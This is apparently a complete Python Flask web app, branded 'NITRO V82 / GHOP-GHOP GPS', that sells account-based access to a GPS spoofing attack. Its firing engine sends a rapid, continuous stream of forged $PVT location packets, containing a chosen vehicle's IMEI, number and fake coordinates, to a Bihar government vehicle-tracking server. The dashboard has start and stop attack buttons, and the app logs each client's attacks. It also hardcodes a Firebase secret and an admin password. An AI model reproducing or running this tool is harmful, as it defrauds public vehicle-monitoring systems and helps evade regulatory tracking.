import os, socket, threading, time, requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_corporate_final"

# --- CONFIGURATION (PURANA DATA) ---
FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"
TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

# --- ADMIN CREDENTIALS ---
ADMIN_UID = "admin"
ADMIN_PASS = "admin6721"

# --- ENGINE STATE ---
status = {"firing": False, "count": 0, "proto": "UDP", "imei": "", "vno": "", "lat": "", "lon": ""}

# --- HTML TEMPLATES (CLEAN & PROFESSIONAL) ---

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - LOGIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { border: 2px solid #0f0; padding: 40px; border-radius: 20px; background: #050505; box-shadow: 0 0 30px rgba(0,255,0,0.3); width: 320px; text-align: center; }
        h1 { font-size: 24px; letter-spacing: 3px; margin-bottom: 30px; text-shadow: 0 0 10px #0f0; }
        input { width: 90%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 8px; text-align: center; font-size: 16px; }
        .btn { padding: 15px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; text-transform: uppercase; font-size: 18px; margin-top: 10px; }
        .admin-entry { margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; }
        .admin-btn { display: block; padding: 12px; background: #111; color: #0f0; border: 1px solid #0f0; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 14px; transition: 0.3s; }
        .admin-btn:hover { background: #0f0; color: #000; }
        .error { color: #f00; font-weight: bold; margin-bottom: 15px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="login-box">
        <h1>GHOP-GHOP GPS</h1>
        {% if error %}<div class="error">{{error}}</div>{% endif %}
        <form method="post">
            <input type="text" name="userid" placeholder="USER ID" required>
            <input type="password" name="password" placeholder="PASSWORD" required>
            <button class="btn">LOGIN SYSTEM</button>
        </form>
        <div class="admin-entry">
            <a href="/admin_login" class="admin-btn">🔐 ADMIN CONTROL PANEL</a>
        </div>
    </div>
</body>
</html>
"""

ADMIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO PRO ADMIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        :root { --neon: #0f0; --bg: #000; --card: #0a0a0a; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 15px; }
        .navbar { display: flex; justify-content: space-between; align-items: center; background: var(--card); padding: 15px; border-bottom: 2px solid var(--neon); position: sticky; top:0; z-index:100; }
        .stats-container { display: flex; gap: 15px; margin: 20px 0; }
        .stat-card { flex: 1; background: var(--card); padding: 20px; border-radius: 12px; border: 1px solid #222; text-align: center; border-bottom: 3px solid var(--neon); }
        .stat-card h4 { margin: 0; color: #888; font-size: 12px; text-transform: uppercase; }
        .stat-card p { margin: 10px 0 0; font-size: 24px; font-weight: bold; color: var(--neon); }
        .section { background: var(--card); padding: 20px; border-radius: 15px; margin-bottom: 25px; border: 1px solid #222; }
        h2 { color: var(--neon); font-size: 20px; margin-top: 0; display: flex; align-items: center; gap: 10px; }
        input, button { background: #111; border: 1px solid #333; color: #fff; padding: 12px; border-radius: 8px; width: 100%; box-sizing: border-box; margin-bottom: 12px; font-size: 15px; }
        input:focus { border-color: var(--neon); outline: none; }
        button.primary { background: var(--neon); color: #000; font-weight: bold; border: none; cursor: pointer; height: 50px; font-size: 16px; }
        .table-box { overflow-x: auto; border-radius: 10px; border: 1px solid #222; }
        table { width: 100%; border-collapse: collapse; background: #050505; }
        th { background: #1a1a1a; color: var(--neon); padding: 15px; text-align: left; font-size: 13px; text-transform: uppercase; }
        td { padding: 15px; border-bottom: 1px solid #111; font-size: 14px; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; background: #222; }
        .active { color: #0f0; } .blocked { color: #f00; }
        .row { display: flex; gap: 10px; }
    </style>
</head>
<body>
    <div class="navbar">
        <h3 style="margin:0;">🚀 NITRO <span style="color:var(--neon)">V82 PRO</span></h3>
        <a href="/logout" style="color:#f00; text-decoration:none; font-weight:bold;">[LOGOUT]</a>
    </div>

    <div class="stats-container">
        <div class="stat-card"><h4>Total Clients</h4><p>{{users|length}}</p></div>
        <div class="stat-card"><h4>Active Attacks</h4><p>{{records|length}}</p></div>
    </div>

    <div class="section">
        <h2>➕ USER REGISTRATION & LOCATION</h2>
        <form action="/admin/add" method="POST">
            <input type="text" name="new_uid" placeholder="Client Phone Number (ID)" required>
            <input type="text" name="new_pw" placeholder="Assign Password" required>
            <div class="row">
                <input type="text" name="base_lat" placeholder="Default Latitude (Ex: 25.65)">
                <input type="text" name="base_lon" placeholder="Default Longitude (Ex: 84.78)">
            </div>
            <input type="date" name="expiry" title="Expiry Date" required>
            <button class="primary">CREATE / UPDATE ACCOUNT</button>
        </form>
    </div>

    <div class="section">
        <h2>👥 MANAGED USERS</h2>
        <div class="table-box">
            <table>
                <tr><th>USER ID</th><th>PASSWORD</th><th>EXPIRY</th><th>LAT/LON</th><th>STATUS</th><th>ACTIONS</th></tr>
                {% for uid, data in users.items() %}
                <tr>
                    <td><b>{{uid}}</b></td>
                    <td>{{data.password}}</td>
                    <td style="color:#aaa;">{{data.expiry}}</td>
                    <td style="color:#666; font-size:11px;">{{data.lat}}, {{data.lon}}</td>
                    <td><span class="badge {{data.status|lower}}">{{data.status}}</span></td>
                    <td>
                        <a href="/admin/toggle/{{uid}}" style="color:orange; text-decoration:none;">[BLOCK]</a>
                        <a href="/admin/delete/{{uid}}" style="color:red; text-decoration:none; margin-left:10px;" onclick="return confirm('Delete permanently?')"> [DELETE]</a>
                    </td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </div>

    <div class="section">
        <h2>🔥 LIVE ATTACK HISTORY (REAL-TIME)</h2>
        <div class="table-box">
            <table>
                <tr><th>VEHICLE NO</th><th>ATTACKED BY</th><th>LAST SYNC TIME</th><th>LATITUDE</th></tr>
                {% for vno, log in records.items() %}
                <tr>
                    <td style="color:var(--neon); font-weight:bold;">{{vno}}</td>
                    <td><span style="color:yellow;">{{log.User}}</span></td>
                    <td style="color:#888;">{{log.Last_Sync}}</td>
                    <td style="color:#aaa;">{{log.Lat}}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </div>
</body>
</html>
"""

# DASH_HTML (Dashboard logic remains 100% same as original)
DASH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - DASHBOARD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; text-align: center; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; max-width: 450px; margin: auto; background: #050505; box-shadow: 0 0 20px #0f0; }
        #map { height: 250px; width: 100%; border: 1px solid #0f0; border-radius: 10px; margin: 15px 0; }
        .metric { font-size: 45px; color: #fff; font-weight: bold; margin: 10px 0; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; text-align: left; }
        input, select { width: 100%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; box-sizing: border-box; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-weight: bold; cursor: pointer; border: none; border-radius: 8px; width: 100%; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; }
        .stop { background: #800; color: #fff; }
        .gps { background: #004466; color: #fff; }
        .logout { background: none; color: #f00; border: 1px solid #f00; font-size: 10px; cursor: pointer; float: left; }
    </style>
</head>
<body>
    <div class="box">
        <form action="/logout" method="post"><button class="logout">LOGOUT: {{session['user']}}</button></form>
        <div style="clear:both;"></div>
        <h2 style="margin:10px 0;">💋 GHOP-GHOP GPS 💋</h2>
        <div class="metric" id="cnt">0</div>
        <form action="/action" method="post" class="grid">
            <div class="full"><input type="text" name="vno" id="vno" value="{{vno}}" placeholder="VEHICLE NO" onblur="checkVehicle()" required></div>
            <div class="full"><input type="text" name="imei" id="imei" value="{{imei}}" placeholder="IMEI NO" required></div>
            <div><input type="text" name="lat" id="lat" value="{{lat}}" placeholder="LAT"></div>
            <div><input type="text" name="lon" id="lon" value="{{lon}}" placeholder="LON"></div>
            <button type="button" class="btn gps full" onclick="getLocation()">📍 GET GPS</button>
            <div class="full">
                <select name="proto">
                    <option value="UDP" {% if proto == 'UDP' %}selected{% endif %}>UDP (Bihar Govt)</option>
                    <option value="TCP" {% if proto == 'TCP' %}selected{% endif %}>TCP (Fallback)</option>
                </select>
            </div>
            <button class="btn start full" name="btn" value="start">🔥 START ATTACK</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ATTACK</button>
        </form>
    </div>
    <div id="map"></div>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        var map = L.map('map').setView([{{lat or 25.6}}, {{lon or 84.7}}], 13);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var marker = L.marker([{{lat or 25.6}}, {{lon or 84.7}}]).addTo(map);
        async function checkVehicle() {
            let vno = document.getElementById('vno').value.toUpperCase();
            if(!vno) return;
            let res = await fetch(`/check_vehicle?vno=${vno}`);
            let data = await res.json();
            if(data.imei) { document.getElementById('imei').value = data.imei; }
        }
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    document.getElementById('lat').value = pos.coords.latitude.toFixed(7);
                    document.getElementById('lon').value = pos.coords.longitude.toFixed(7);
                    let p = [pos.coords.latitude, pos.coords.longitude];
                    map.setView(p, 15); marker.setLatLng(p);
                });
            }
        }
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count.toLocaleString();
            });
        }, 1000);
    </script>
</body>
</html>
"""

# --- LOGIC FUNCTIONS (100% SAME AS ORIGINAL) ---

def get_fb(path):
    try: return requests.get(f"{FB_URL}/{path}.json?auth={FB_SECRET}", timeout=5).json()
    except: return {}

def log_to_firebase():
    try:
        now = datetime.now()
        user_id = session.get('user')
        vno = status["vno"]
        log_data = {"Vehicle_No": vno, "IMEI_No": status["imei"], "User": user_id, "Lat": status["lat"], "Lon": status["lon"], "Last_Sync": now.strftime('%Y-%m-%d %H:%M:%S'), "Status": "Active"}
        requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data, timeout=5)
        requests.put(f"{FB_URL}/Attack_History/{now.strftime('%Y-%m-%d')}/{user_id}/{vno}/{now.strftime('%H%M%S')}.json?auth={FB_SECRET}", json=log_data, timeout=5)
    except: pass

def firing_engine():
    target = ("vlts.bihar.gov.in", 9999)
    while status["firing"]:
        try:
            tag = TAG_LIST[status["count"] % len(TAG_LIST)]
            now = datetime.now()
            f_lat, f_lon = "{:.7f}".format(float(status["lat"])), "{:.7f}".format(float(status["lon"]))
            pkt = f"$PVT,{tag},{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{f_lat},N,{f_lon},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if status["proto"] == "UDP" else socket.SOCK_STREAM)
            if status["proto"] == "TCP":
                sock.settimeout(3); sock.connect(target); sock.send(pkt)
            else: sock.sendto(pkt, target)
            status["count"] += 1
            sock.close()
            time.sleep(0.015) 
        except: time.sleep(1)

# --- ROUTES ---

@app.route('/', methods=['GET', 'POST'])
def login():
    if 'user' in session: return redirect(url_for('dashboard'))
    error = None
    if request.method == 'POST':
        uid, pw = request.form.get('userid', '').strip(), request.form.get('password', '').strip()
        data = get_fb(f"users/{uid}")
        if data and str(data.get('password')) == str(pw):
            exp = data.get('expiry', '2000-01-01')
            if datetime.now() > datetime.strptime(exp, '%Y-%m-%d'): error = f"EXPIRED: {exp}"
            elif data.get('status') != "Active": error = "ACCOUNT BLOCKED"
            else:
                session.update({'user': uid, 'access_level': data.get('access_level', 'pro'), 'def_lat': str(data.get('lat', '25.298801')), 'def_lon': str(data.get('lon', '84.651033'))})
                status.update({"lat": session['def_lat'], "lon": session['def_lon']})
                return redirect(url_for('dashboard'))
        else: error = "INVALID USER ID OR PASSWORD"
    return render_template_string(LOGIN_HTML, error=error)

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_auth():
    error = None
    if request.method == 'POST':
        if request.form.get('uid') == ADMIN_UID and request.form.get('pw') == ADMIN_PASS:
            session['is_admin'] = True
            return redirect('/admin')
        error = "WRONG ADMIN PASSWORD!"
    return render_template_string('<body style="background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;"><form method="POST" style="border:2px solid #0f0;padding:40px;border-radius:15px;background:#050505;text-align:center;box-shadow:0 0 20px #0f0;"><h2>🔐 ADMIN ACCESS</h2>{% if error %}<p style="color:red;">{{error}}</p>{% endif %}<input name="uid" placeholder="ADMIN ID" style="padding:15px;margin:10px;background:#000;border:1px solid #0f0;color:#0f0;border-radius:8px;"><br><input type="password" name="pw" placeholder="PASSWORD" style="padding:15px;margin:10px;background:#000;border:1px solid #0f0;color:#0f0;border-radius:8px;"><br><br><button style="padding:15px 40px;background:#0f0;border:none;font-weight:bold;cursor:pointer;border-radius:8px;">ENTER CONTROL PANEL</button></form></body>', error=error)

@app.route('/admin')
def admin_panel():
    if not session.get('is_admin'): return redirect('/admin_login')
    return render_template_string(ADMIN_HTML, users=get_fb("users"), records=get_fb("Data_Records"))

@app.route('/admin/add', methods=['POST'])
def add_user():
    if not session.get('is_admin'): return redirect('/')
    uid = request.form.get('new_uid').strip()
    payload = {"access_level": "pro", "expiry": request.form.get('expiry'), "password": request.form.get('new_pw'), "status": "Active", "lat": request.form.get('base_lat') or "25.298801", "lon": request.form.get('base_lon') or "84.651033", "current_device": "none" }
    requests.put(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", json=payload)
    return redirect('/admin')

@app.route('/admin/toggle/<uid>')
def toggle_user(uid):
    if not session.get('is_admin'): return redirect('/')
    curr = get_fb(f"users/{uid}")
    new_status = "Blocked" if curr.get('status') == "Active" else "Active"
    requests.patch(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}", json={"status": new_status})
    return redirect('/admin')

@app.route('/admin/delete/<uid>')
def delete_user(uid):
    if not session.get('is_admin'): return redirect('/')
    requests.delete(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}")
    return redirect('/admin')

@app.route('/dashboard')
def dashboard():
    if 'user' not in session: return redirect(url_for('login'))
    return render_template_string(DASH_HTML, **status)

@app.route('/check_vehicle')
def check_vehicle():
    vno = request.args.get('vno', '').upper()
    data = get_fb(f"Data_Records/{vno}")
    return jsonify({"imei": data.get('IMEI_No') if data else None})

@app.route('/action', methods=['POST'])
def action():
    if 'user' not in session: return redirect(url_for('login'))
    val = request.form.get('btn')
    if val == "start":
        status.update({"imei": request.form.get('imei').strip(), "vno": request.form.get('vno').upper().strip(), "lat": request.form.get('lat').strip(), "lon": request.form.get('lon').strip(), "proto": request.form.get('proto', 'UDP'), "firing": True})
        log_to_firebase()
        threading.Thread(target=firing_engine, daemon=True).start()
    else: status["firing"] = False
    return redirect(url_for('dashboard'))

@app.route('/logout', methods=['POST', 'GET'])
def logout(): session.clear(); return redirect(url_for('login'))

@app.route('/data')
def data(): return jsonify(status)

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
